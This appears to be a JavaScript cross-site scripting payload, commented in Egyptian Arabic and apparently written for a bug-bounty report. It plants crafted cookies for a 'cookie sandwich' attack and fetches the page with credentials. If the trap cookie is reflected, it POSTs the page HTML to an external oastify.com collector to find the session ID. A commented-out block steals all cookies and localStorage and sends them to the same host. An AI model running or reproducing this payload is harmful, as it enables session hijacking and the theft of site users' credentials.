// 1. إثبات التنفيذ (عشان نصور بيها الريبورت)
alert("DOM Clobbering XSS by Hussein on: " + document.domain);



// 1. خلق الـ Sandwich
// الكوكي اللي بتشغل הـ Legacy Parser
document.cookie = "$Version=1; path=/;"; 
// بداية الـ Sandwich
document.cookie = "hussein_test=\"start_sandwich; path=/;"; 
// نهاية الـ Sandwich
document.cookie = "end_sandwich=end\"; path=/;"; 

// 2. فحص الانعكاس (Reflection Check)
// هنعمل fetch للصفحة الرئيسية ولـ صفحة الـ API (لو تعرف API للـ tracking حطه هنا)
fetch(window.location.origin, { credentials: 'include' })
    .then(response => response.text())
    .then(html => {
        // لو السيرفر قرا الـ Sandwich وعكسها، هنلاقي كلمة start_sandwich وجواها كوكيز تانية
        if (html.includes("start_sandwich")) {
            // لو لقيناها، نبعت الـ HTML كله لـ Oastify عشان ندور على הـ PHPSESSID جواه
            fetch("https://2nqfrsyf5u919k496pa4iwbu9lfc33rs.oastify.com", {
                method: "POST",
                mode: "no-cors",
                body: "SANDWICH REFLECTION FOUND:\n\n" + html.substring(0, 5000) 
            });
        }
    });

// 2. استخراج الكوكيز والـ Local Storage
// var userCookies = document.cookie;
// var userStorage = JSON.stringify(localStorage);

// // 3. تجميع الداتا كنص عادي (من غير btoa عشان نتجنب إيرور الحروف)
// var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;

// // 4. إرسال الداتا في الخفاء باستخدام POST Request
// fetch("https://2nqfrsyf5u919k496pa4iwbu9lfc33rs.oastify.com/", {
//     method: "POST",       // استخدام POST عشان الداتا الكبيرة
//     mode: "no-cors",      // تخطي إيرور الـ CORS
//     body: exfilData       // حط الداتا كلها هنا
// });
